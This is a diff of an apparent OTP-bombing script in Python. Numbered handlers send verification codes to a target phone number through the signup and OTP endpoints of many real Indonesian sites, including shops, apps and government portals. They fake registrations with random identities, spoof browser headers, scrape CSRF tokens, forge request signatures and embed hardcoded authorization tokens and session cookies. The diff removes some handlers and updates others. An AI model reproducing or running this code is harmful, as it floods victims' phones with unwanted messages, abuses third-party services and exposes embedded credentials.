@@ -120,7 +120,8 @@ def send_erafone_otp(phone_number):
         "sec-ch-ua-platform": '"Android"',
         "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
         "otp-provider": "whatsapp",
-        "signature": "d2afc6a94fc469d0633f477ed2a73a155bc379d8d138d5e9885a2b612bb3d077",
+        "signature": "6e1dbc2dfa881e02e91492ff28c585f12402691976621ee9c2552826bc423b6e",
+        "content-length": "62",
         "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
         "sec-ch-ua-mobile": "?1",
         "source": "erafone",
@@ -128,6 +129,8 @@ def send_erafone_otp(phone_number):
         "Accept": "application/json, text/plain, */*",
         "Content-Type": "application/json",
         "sms-client": "erafone",
+        "otp-client": "erafone",
+        "otp-provider": "whatsapp",
         "platform": "erafone-web",
         "Origin": "https://erafone.com",
         "Referer": "https://erafone.com/",
@@ -141,54 +144,9 @@ def send_erafone_otp(phone_number):
     except Exception as e:
         return None, {"error": str(e)}
 
-# ==================== HANDLER 3: PLANETBAN ====================
-def send_planetban_otp(phone_number):
-    url = "https://api.planetban.com/website/customer/request-otp"
-    headers = {
-        "Content-Type": "application/json",
-        "Origin": "https://planetban.com",
-        "User-Agent": get_random_user_agent(),
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Encoding": "gzip, deflate, br, zstd",
-        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-        "Connection": "keep-alive",
-    }
-    payload = {"name": "Test", "phone": phone_number, "password": "Test123", "purpose": "register", "method": "whatsapp"}
-    try:
-        session = requests.Session()
-        session.headers.update(headers)
-        resp = session.post(url, json=payload, timeout=15)
-        return resp
-    except Exception:
-        return None
-
-# ==================== HANDLER 4: TUNEUP ====================
-def send_tuneup_otp(phone_number):
-    url = "https://api.tuneup.id/v1/mitra/register/send-otp"
-    headers = {
-        "Origin": "https://dashboard.tuneup.id",
-        "Referer": "https://dashboard.tuneup.id/",
-        "User-Agent": get_random_user_agent(),
-        "Accept": "application/json, text/plain, */*",
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "sec-ch-ua-platform": '"Android"',
-        "sec-ch-ua-mobile": "?1",
-    }
-    name = ''.join(random.choices(string.ascii_lowercase, k=8))
-    company = "PT " + name.capitalize()
-    data = {
-        "company_name": company, "owner_name": name.capitalize(),
-        "address": ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
-        "email": name + "@mailnesia.com", "phone_number": phone_number,
-        "province_code": "32", "city_code": "32.04", "subscription_id": "undefined",
-        "channel": "whatsapp", "agreement": "true", "service_categories[]": "3",
-    }
-    resp = requests.post(url, data=data, headers=headers, timeout=15)
-    return resp
-
 # ==================== HANDLER 5: HASHMICRO ====================
 def send_hashmicro_otp(phone_number):
-    name = 'User' + ''.join(random.choices(string.ascii_letters, k=5))
+    name = 'popsa' + ''.join(random.choices(string.ascii_letters, k=5))
     email = f'{name.lower()}@gmail.com'
     company = 'PT ' + name
     return {
@@ -208,47 +166,6 @@ def send_hashmicro_otp(phone_number):
         'position': '43', 'team': '6', 'honeypot': '', 'ipaddrs': get_public_ip(), 'uip': get_public_ip(),
         'OngoingId': '', 'provn': 'Jakarta'
     }
-
-# ==================== HANDLER 6: KLOOK ====================
-def send_klook_otp(phone_number):
-    url = "https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id=" + str(uuid.uuid4())
-    headers = {
-        "Host": "www.klook.com",
-        "x-klook-user-residence": "15_SG",
-        "sec-ch-ua-platform": '"Android"',
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "x-klook-request-id": str(uuid.uuid4())[:12].replace('-', '')[:6] + "_" + str(uuid.uuid4())[:6].replace('-', ''),
-        "sec-ch-ua-mobile": "?1",
-        "accept": "application/json, text/plain, */*",
-        "content-type": "application/json",
-        "token": "",
-        "x-platform": "mobile",
-        "cache-control": "no-cache",
-        "x-klook-kepler-id": str(uuid.uuid4()),
-        "accept-language": "en_SG",
-        "currency": "SGD",
-        "user-agent": get_random_user_agent(),
-        "origin": "https://www.klook.com",
-        "sec-fetch-site": "same-origin",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-dest": "empty",
-        "referer": "https://www.klook.com/en-SG/signin/?aid=87721",
-    }
-    cookies = {
-        "kepler_id": str(uuid.uuid4()),
-        "klk_currency": "SGD",
-        "klk_rdc": "SG",
-        "_gid": "GA1.2." + str(random.randint(1000000000, 9999999999)),
-        "klk_sessionid": "MQ." + uuid.uuid4().hex[:32],
-        "_ga": "GA1.1." + str(random.randint(1000000000, 9999999999)) + "." + str(int(time.time())),
-    }
-    payload = {
-        "action": "login_register", "type": 1, "rcv": phone_number, "is_resend": False,
-        "payload": {"mobile": phone_number, "term_ids": [330], "mobile_token": "", "invite_code": ""},
-        "_rc": "", "rcv_token": ""
-    }
-    resp = requests.post(url, json=payload, headers=headers, cookies=cookies, timeout=15)
-    return resp
 
 # ==================== HANDLER 7: INTERNET RAKYAT ====================
 def send_internetrakyat_otp(phone_08):
@@ -295,119 +212,6 @@ def send_ultramilk_register(phone_number):
     payload = {"name": name, "email": email, "password": password, "phone_number": phone_number, "portal": "IcownicPatch", "is_consent": True}
     resp = requests.post(url, json=payload, headers=headers, timeout=15)
     return resp
-
-# ==================== HANDLER 9: KANIVA ====================
-def send_kaniva_otp(number_08, name):
-    sess = requests.Session()
-    sess.headers.update({"User-Agent": get_random_user_agent()})
-    try:
-        r = sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", timeout=15)
-        if r.status_code != 200:
-            return None
-    except Exception:
-        return None
-    csrf = None
-    match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
-    if match:
-        csrf = match.group(1)
-    else:
-        raw = sess.cookies.get("XSRF-TOKEN", "")
-        if raw:
-            csrf = urllib.parse.unquote(raw)
-    if not csrf:
-        return None
-    otp_url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
-    headers_otp = {
-        "X-XSRF-TOKEN": csrf, "X-Inertia": "true",
-        "X-Inertia-Version": "56e6482206af61d5490c1118b2876044",
-        "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/json",
-        "Origin": "https://daftar.kanivainternationalbali.com",
-        "Referer": "https://daftar.kanivainternationalbali.com/register/whatsapp",
-        "Accept": "application/json", "User-Agent": get_random_user_agent(),
-    }
-    payload = {"name": name, "phone": number_08}
-    try:
-        resp = sess.post(otp_url, json=payload, headers=headers_otp, timeout=15)
-        return resp
-    except Exception:
-        return None
-
-# ==================== HANDLER 10: JEMBATANI ====================
-def send_jembatani_otp(phone_number, name, password):
-    headers = {
-        "Host": "api.jembatani.co.id", "sec-ch-ua-platform": '"Android"',
-        "authorization": "Bearer 4aa440574d1da1687276e697495154499b6eaf6142eaaef007271fcd840aca98",
-        "user-agent": get_random_user_agent(), "accept": "application/json, text/plain, */*",
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "content-type": "application/json", "sec-ch-ua-mobile": "?1",
-        "origin": "https://jembatani.co.id", "sec-fetch-site": "same-site",
-        "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://jembatani.co.id/",
-    }
-    reg_payload = {"phone_number": phone_number, "name": name, "role": "farmer", "password": password, "password_confirmation": password, "consent": "1"}
-    try:
-        reg_resp = requests.post("https://api.jembatani.co.id/v1/register", json=reg_payload, headers=headers, timeout=15)
-        if reg_resp.status_code == 200 and '"success":true' in reg_resp.text:
-            return reg_resp
-    except Exception:
-        pass
-    try:
-        resend_resp = requests.post("https://api.jembatani.co.id/v1/regenerate-otp", json={"phone_number": phone_number}, headers=headers, timeout=15)
-        return resend_resp
-    except Exception:
-        return None
-
-# ==================== HANDLER 11: RCX ====================
-def send_rcx_otp(identifier, name, email):
-    sess = requests.Session()
-    sess.headers.update({"User-Agent": get_random_user_agent()})
-    try:
-        reg_get = sess.get("https://sso.rcx.co.id/register", timeout=15)
-        if reg_get.status_code != 200:
-            return None
-    except Exception:
-        return None
-    token = None
-    if "XSRF-TOKEN" in sess.cookies:
-        token = urllib.parse.unquote(sess.cookies["XSRF-TOKEN"])
-    if not token:
-        match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', reg_get.text)
-        if match:
-            token = match.group(1)
-    if not token:
-        return None
-    url = "https://sso.rcx.co.id/auth/passwordless/request"
-    headers = {
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://sso.rcx.co.id", "Referer": "https://sso.rcx.co.id/register",
-        "User-Agent": get_random_user_agent(),
-    }
-    data = {"_token": token, "mode": "register", "channel": "whatsapp", "name": name, "email": email, "identifier": identifier}
-    try:
-        resp = sess.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
-        return resp
-    except Exception:
-        return None
-
-# ==================== HANDLER 12: SAHABAT TEKNISI ====================
-def send_sahabatteknisi_otp(phone_number):
-    url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
-    headers = {
-        "sec-ch-ua-platform": '"Android"', "x-requested-with": "XMLHttpRequest",
-        "user-agent": get_random_user_agent(), "accept": "*/*",
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "content-type": "application/json", "sec-ch-ua-mobile": "?1",
-        "origin": "https://www.sahabatteknisi.co.id", "sec-fetch-site": "same-origin",
-        "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
-        "referer": "https://www.sahabatteknisi.co.id/checkout/confirm",
-    }
-    payload = {"phone": phone_number}
-    try:
-        resp = requests.post(url, json=payload, headers=headers, timeout=15)
-        return resp
-    except Exception:
-        return None
 
 # ==================== HANDLER 13: AUTO2000 ====================
 _AUTO2000_BASE = "https://auto2000.co.id"
@@ -489,30 +293,6 @@ def send_astra_daihatsu_otp(phone_62):
     except requests.exceptions.RequestException as e:
         return None
 
-# ==================== HANDLER 15: ROYAL CANIN ====================
-def send_royal_canin_otp(phone_plus):
-    sess = requests.Session()
-    sess.headers.update({
-        "Host": "club.royalcanin.id", "sec-ch-ua-platform": '"Android"',
-        "User-Agent": get_random_user_agent(),
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "content-type": "application/json", "sec-ch-ua-mobile": "?1", "accept": "*/*",
-        "origin": "https://club.royalcanin.id", "sec-fetch-site": "same-origin",
-        "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
-        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-    })
-    try:
-        resp = sess.get("https://club.royalcanin.id/sign-up", timeout=15)
-        if resp.status_code != 200:
-            return None
-    except Exception:
-        return None
-    try:
-        resp = sess.post("https://club.royalcanin.id/api/get_otp", json={"params": {"Email": "", "mobile_number": phone_plus, "OTPType": "IM"}}, timeout=20)
-        return resp
-    except Exception:
-        return None
-
 # ==================== HANDLER 16: WATSONS ====================
 def send_watsons_otp(phone_no_code):
     url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
@@ -528,7 +308,7 @@ def send_watsons_otp(phone_no_code):
         "referer": "https://www.watsons.co.id/", "accept-encoding": "gzip, deflate, br, zstd",
         "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
     }
-    cookies = {"authorization": "Pi_D6dqblYElXgy4mWOXjkLCaZg", "token_type": "guest", "PIM-SESSION-ID": "fFENbGdcaOZMa62p"}
+    cookies = {"authorization": "Pi_D6dqblYElXgy4mWOXjkLCaZg", "token_type": "guest", "PIM-SESSION-ID": "qxxKuEI5by58jmGd"}
     payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": phone_no_code, "type": "WHATSAPP"}
     try:
         resp = requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=15)
@@ -557,20 +337,6 @@ def send_99co_otp(phone_plus):
     payload = {"brand": "99id", "destination_address": phone_plus, "type_id": 2}
     return sess.post(url, headers=headers, json=payload, timeout=15)
 
-# ==================== HANDLER 18: BELIRUMAH ====================
-def send_belirumah_otp(phone_plus):
-    url = "https://api.belirumah.co/api/otp/request_new"
-    headers = {
-        "Host": "api.belirumah.co", "sec-ch-ua-platform": '"Android"',
-        "User-Agent": get_random_user_agent(), "Accept": "application/json, text/plain, */*",
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "Content-Type": "application/json", "sec-ch-ua-mobile": "?1",
-        "Origin": "https://belirumah.co", "Sec-Fetch-Site": "same-site",
-        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://belirumah.co/",
-    }
-    payload = {"phone_number": phone_plus}
-    return requests.post(url, json=payload, headers=headers, timeout=15)
-
 # ==================== HANDLER 19: FASTWORK ====================
 def send_fastwork_otp(phone_08):
     url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
@@ -584,228 +350,6 @@ def send_fastwork_otp(phone_08):
     }
     payload = {"phone_number": phone_08}
     return requests.post(url, json=payload, headers=headers, timeout=15)
-
-# ==================== HANDLER 20: BEAUTYHAUL ====================
-def send_beautyhaul_otp(local_number):
-    base = "https://www.beautyhaul.com"
-    nama_depan = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
-    nama_belakang = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
-    rand_email = f"{nama_depan.lower()}{random.randint(100,999)}@gmail.com"
-    password = "Testt#12334"
-    reg_payload = {
-        "nama_depan": nama_depan, "nama_belakang": nama_belakang, "email": rand_email,
-        "nomor_kode_id": "100", "nomor_kode_value": "62", "nomor_ponsel": local_number,
-        "password": password, "konfirmasi_password": password, "tanggal_lahir": "20 Jun 2015",
-        "jenis_kelamin": random.choice(["Female", "Male"]), "g-recaptcha-response": "",
-        "subscribe": "true", "terms": "true"
-    }
-    bh_session = requests.Session()
-    bh_session.headers.update({
-        "host": "www.beautyhaul.com", "sec-ch-ua-platform": '"Android"',
-        "user-agent": get_random_user_agent(), "accept": "application/json, text/plain, */*",
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "content-type": "application/json", "sec-ch-ua-mobile": "?1",
-        "origin": "https://www.beautyhaul.com", "sec-fetch-site": "same-origin",
-        "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
-        "referer": "https://www.beautyhaul.com/account/register",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-    })
-    try:
-        bh_session.post(f"{base}/ajax/account/save_register", json=reg_payload, timeout=12)
-    except Exception:
-        pass
-    try:
-        r_otp = bh_session.post(f"{base}/ajax/account/send_otp", json={"method": "WhatsApp"}, timeout=12)
-        return r_otp
-    except Exception:
-        return None
-
-# ==================== HANDLER 21: HAINAYA ====================
-def send_hainaya_otp(phone_for_api):
-    headers_register = {
-        "Host": "app.hainaya.id", "sec-ch-ua-platform": '"Android"',
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "sec-ch-ua-mobile": "?1", "user-agent": get_random_user_agent(),
-        "accept": "application/json, text/plain, */*", "content-type": "application/json",
-        "origin": "https://app.hainaya.id", "sec-fetch-site": "same-origin",
-        "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
-        "referer": "https://app.hainaya.id/onboard",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "id,en-US;q=0.9,en;q=0.8", "priority": "u=1, i"
-    }
-    prefixes = ['Tst', 'Coba', 'Uji', 'Test', 'Demo', 'Sample', 'Bisnis']
-    mid = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
-    business_name = random.choice(prefixes) + mid.capitalize() + str(random.randint(10, 999))
-    register_payload = {
-        "business_name": business_name, "vertical": "salon", "vendor_type": "nail_salon",
-        "business_phone": phone_for_api, "owner_name": "", "owner_phone": phone_for_api
-    }
-    try:
-        resp = requests.post("https://app.hainaya.id/api/onboarding/register", headers=headers_register, json=register_payload, timeout=15)
-        if resp.status_code == 201:
-            return resp
-        if resp.status_code == 409:
-            resp_login = requests.post("https://app.hainaya.id/api/auth/login", headers={**headers_register, "referer": "https://app.hainaya.id/login"}, json={"phone_number": phone_for_api}, timeout=15)
-            return resp_login
-        return resp
-    except Exception:
-        return None
-
-# ==================== HANDLER 22: MINUMYUKKAKA ====================
-def send_minumyukkaka_otp(phone_08):
-    session = requests.Session()
-    cookies = {
-        "currency": "IDR",
-        "_gcl_au": f"1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
-        "_ga": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
-    }
-    session.cookies.update(cookies)
-    first_name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
-    email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
-    password = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
-    register_url = "https://minumyukkaka.com/services/liquid/Register"
-    headers_register = {
-        "Host": "minumyukkaka.com", "sec-ch-ua-platform": '"Android"',
-        "x-requested-with": "XMLHttpRequest", "user-agent": get_random_user_agent(), "accept": "*/*",
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "sec-ch-ua-mobile": "?1",
-        "origin": "https://minumyukkaka.com", "referer": "https://minumyukkaka.com/register",
-        "accept-encoding": "gzip, deflate, br, zstd", "accept-language": "id,en-US;q=0.9,en;q=0.8",
-    }
-    register_data = {
-        "registerModel[first_name]": first_name, "registerModel[last_name]": "",
-        "registerModel[email]": email, "registerModel[phone]": phone_08, "registerModel[otp]": "",
-        "registerModel[password]": password, "registerModel[verify_password]": password,
-        "registerModel[IsAddressRequired]": "false", "registerModel[pin]": "", "registerModel[verify_pin]": ""
-    }
-    try:
-        session.post(register_url, headers=headers_register, data=register_data, timeout=15)
-    except Exception:
-        pass
-    x_sat = session.cookies.get('x-sat') or session.cookies.get('X-SAT') or ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
-    headers_otp = {**headers_register, "x-sat": x_sat}
-    otp_data = {"destination": phone_08, "otpLength": "6"}
-    try:
-        resp = session.post("https://minumyukkaka.com/services/identity/requestOTP", headers=headers_otp, data=otp_data, timeout=15)
-        return resp
-    except Exception:
-        return None
-
-# ==================== HANDLER 23: SIDEMANG PALEMBANG ====================
-def send_sidemang_otp(phone_08):
-    email_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
-    email = f"{email_name}{random.randint(100, 999)}@gmail.com"
-    url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
-    headers = {
-        "Host": "sidemang.palembang.go.id", "sec-ch-ua-platform": '"Android"',
-        "user-agent": get_random_user_agent(), "accept": "application/json, text/plain, */*",
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "content-type": "application/json", "sec-ch-ua-mobile": "?1",
-        "origin": "https://sidemang.palembang.go.id", "sec-fetch-site": "same-origin",
-        "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
-        "referer": "https://sidemang.palembang.go.id/lambidaro/register-otp",
-        "accept-encoding": "gzip, deflate, br, zstd", "accept-language": "id,en-US;q=0.9,en;q=0.8",
-        "priority": "u=1, i"
-    }
-    cookies = {"_ga": f"GA1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}"}
-    payload = {"phoneNumber": phone_08, "email": email}
-    try:
-        resp = requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=15)
-        return resp
-    except Exception:
-        return None
-
-# ==================== HANDLER 24: LAPORMASBUP KLATEN ====================
-_registered_phones = {}
-
-def send_lapormasbup_otp(phone_08):
-    global _registered_phones
-    if phone_08 in _registered_phones:
-        url = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
-        headers = {
-            "Host": "lapormasbup.klaten.go.id", "sec-ch-ua-platform": '"Android"',
-            "User-Agent": get_random_user_agent(),
-            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-            "Content-Type": "application/json", "sec-ch-ua-mobile": "?1", "Accept": "*/*",
-            "Origin": "https://lapormasbup.klaten.go.id", "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
-            "Referer": "https://lapormasbup.klaten.go.id/confirm_otp",
-            "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
-        }
-        payload = {"mobilephone": phone_08}
-        try:
-            resp = requests.post(url, headers=headers, json=payload, timeout=15)
-            return resp, True
-        except Exception:
-            return None, True
-    name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
-    email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
-    password = "Pass" + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "$"
-    birth_date = f"{random.randint(1966, 2010)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"
-    address = f"Jl. {''.join(random.choices(string.ascii_letters, k=6)).capitalize()} No. {random.randint(1, 200)}"
-    gender = random.choice(['Laki-Laki', 'Perempuan'])
-    url = "https://lapormasbup.klaten.go.id/api/register"
-    headers = {
-        "Host": "lapormasbup.klaten.go.id", "sec-ch-ua-platform": '"Android"',
-        "User-Agent": get_random_user_agent(),
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "Content-Type": "application/json", "sec-ch-ua-mobile": "?1", "Accept": "*/*",
-        "Origin": "https://lapormasbup.klaten.go.id", "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
-        "Referer": "https://lapormasbup.klaten.go.id/registrasi",
-        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
-    }
-    payload = {"name": name, "email": email, "mobilephone": phone_08, "gender": gender, "warga_birth_date": birth_date, "password": password, "address": address}
-    try:
-        resp = requests.post(url, headers=headers, json=payload, timeout=15)
-        if resp.status_code == 200:
-            try:
-                data = resp.json()
-                if 'user' in data and 'warga_id' in data['user']:
-                    _registered_phones[phone_08] = True
-            except Exception:
-                pass
-        elif resp.status_code == 400:
-            try:
-                data = resp.json()
-                if 'verifikasi' in data.get('error', '').lower():
-                    _registered_phones[phone_08] = True
-                    resend_resp, _ = send_lapormasbup_otp(phone_08)
-                    return resend_resp, True
-            except Exception:
-                pass
-        return resp, False
-    except Exception:
-        return None, False
-
-# ==================== HANDLER 25: PTSP KEMENAG ====================
-def send_ptsp_kemenag_otp(phone_08):
-    name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
-    email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
-    letters = ''.join(random.choices(string.ascii_letters, k=6))
-    digits = ''.join(random.choices(string.digits, k=2))
-    chars = list(letters + digits)
-    random.shuffle(chars)
-    password = 'Pass' + ''.join(chars) + '$'
-    url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
-    headers = {
-        "Host": "dev-ptsp.kemenag.go.id", "sec-ch-ua-platform": '"Android"',
-        "User-Agent": get_random_user_agent(), "Accept": "application/json, text/plain, */*",
-        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-        "Content-Type": "application/json", "sec-ch-ua-mobile": "?1",
-        "Origin": "https://dev-ptsp.kemenag.go.id", "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
-        "Referer": "https://dev-ptsp.kemenag.go.id/login",
-        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
-    }
-    cookies = {"cookiesession1": ''.join(random.choices(string.hexdigits.upper(), k=32))}
-    payload = {"nama": name, "wa": phone_08, "email": email, "password": password}
-    try:
-        resp = requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=15)
-        return resp
-    except Exception:
-        return None
 
 # ==================== HANDLER 26: DUNIA GAMES ====================
 def send_duniagames_otp(phone_08):
@@ -1645,66 +1189,6 @@ def send_pizzahut_otp(phone_input):
     except Exception as e:
         return None, str(e)
 
-
-# ==================== HANDLER 45: SEGARI ====================
-def send_segari_otp2(phone_input):
-    p = normalize(phone_input)
-    phone = p['fmt_08']
-    BASE_URL  = "https://segari.id"
-    API_BASE  = "https://api-v2.segari.id"
-    UA        = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/155.0.0.0 Safari/537.36"
-    CLIENT_ID = "23809367d8bd04035ee712c6a68d3daed136a21c16ed29dfc1299d6e0525f2c6"
-
-    def _h(extra={}):
-        h = {
-            "accept": "*/*", "accept-encoding": "gzip, deflate",
-            "accept-language": "id,en-US;q=0.9,en;q=0.8",
-            "origin": BASE_URL, "referer": f"{BASE_URL}/",
-            "sec-ch-ua": '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
-            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
-            "user-agent": UA,
-        }
-        h.update(extra)
-        return h
-
-    sess = requests.Session()
-    segari_t = ""
-    try:
-        resp = sess.get(f"{API_BASE}//v1/auth/init", headers=_h(), timeout=10, verify=False)
-        segari_t = resp.json().get("data", {}).get("token", "")
-    except Exception:
-        pass
-    if not segari_t:
-        return None, "segari_t not found"
-
-    nonce     = str(uuid.uuid4())
-    timestamp = int(time.time())
-    signature = hmac.new(segari_t.encode(), f"{timestamp}\n{nonce}\nPOST".encode(), hashlib.sha256).hexdigest()
-
-    import base64 as _b64, json as _json
-    client_info = _b64.b64encode(_json.dumps({
-        "userAgent": UA, "webdriver": "", "screenResolution": "1366x768",
-        "screenColorDepth": 24, "timezone": "Asia/Jakarta", "timezoneOffset": -420,
-        "language": "id", "languages": "id,en-US,en", "platform": "Win32",
-        "hardwareConcurrency": 4, "deviceMemory": 16, "cookieEnabled": True, "onLine": True,
-    }, separators=(",", ":")).encode()).decode()
-
-    headers = _h({
-        "content-type": "application/json;charset=UTF-8", "priority": "u=1, i",
-        "x-client-id": CLIENT_ID, "x-client-info": client_info,
-        "x-segari-n": nonce, "x-segari-pathname": "/login", "x-segari-platform": "web",
-        "x-segari-signature": signature, "x-segari-t": segari_t,
-        "x-segari-timestamp": str(timestamp),
-    })
-    try:
-        resp = sess.post(f"{API_BASE}//v1/otps/generate",
-                         headers=headers, json={"phoneNumber": phone},
-                         timeout=15, verify=False)
-        return resp.status_code, resp.text
-    except Exception as e:
-        return None, str(e)
-
 # ==================== HANDLER 46: AKSELERAN ====================
 def send_akseleran_otp(phone_input):
     p = normalize(phone_input)
@@ -1728,31 +1212,7 @@ def send_akseleran_otp(phone_input):
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
-
-# ==================== HANDLER 47: IRMASTORE ====================
-def send_irmastore_otp(phone_input):
-    p = normalize(phone_input)
-    phone_08 = p['fmt_08']
-    headers = {
-        "accept": "application/json, text/plain, */*",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "id,en-US;q=0.9,en;q=0.8",
-        "content-type": "application/json",
-        "origin": "https://irmastore.id",
-        "referer": "https://irmastore.id/",
-        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
-        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
-        "user-agent": get_random_user_agent(),
-    }
-    payload = {"phone": phone_08, "type": "register"}
-    try:
-        resp = requests.post("https://api.irmastore.id/apps/otp/v2/sendotpwa",
-                             headers=headers, json=payload, timeout=15, verify=False)
-        return resp.status_code, resp.text
-    except Exception as e:
-        return None, str(e)
-
+    
 # ==================== HANDLER 48: TIPTIP ====================
 _TIPTIP_ACCESS_KEY = "79b8a015c53e6a81ea51d9a9e2678ac3"
 
@@ -1797,8 +1257,7 @@ def send_tokoplas_otp(phone_input):
     }
     payload = {"phoneNumber": phone_08, "otpType": "REGISTER", "channel": "WHATSAPP"}
     try:
-        resp = requests.post("https://api.tokoplas.com/v2/register/otp/request",
-                             headers=headers, json=payload, timeout=15, verify=False)
+        resp = requests.post("https://api.tokoplas.com/v2/register/otp/request", headers=headers, json=payload, timeout=15, verify=False)
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
@@ -1849,8 +1308,7 @@ def send_vidio_otp(phone_input):
     }
     payload = {"phone": phone_08}
     try:
-        resp = requests.post("https://api.vidio.com/otp/send",
-                             headers=headers, json=payload, timeout=15, verify=False)
+        resp = requests.post("https://api.vidio.com/otp/send", headers=headers, json=payload, timeout=15, verify=False)
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
@@ -1873,8 +1331,7 @@ def send_kpoin_otp(phone_input):
     }
     payload = {"phone": phone_08}
     try:
-        resp = requests.post("https://app.kpoin.com/api/bff/v1/notification/sendotp",
-                             headers=headers, json=payload, timeout=15, verify=False)
+        resp = requests.post("https://app.kpoin.com/api/bff/v1/notification/sendotp", headers=headers, json=payload, timeout=15, verify=False)
         return resp.status_code, resp.text
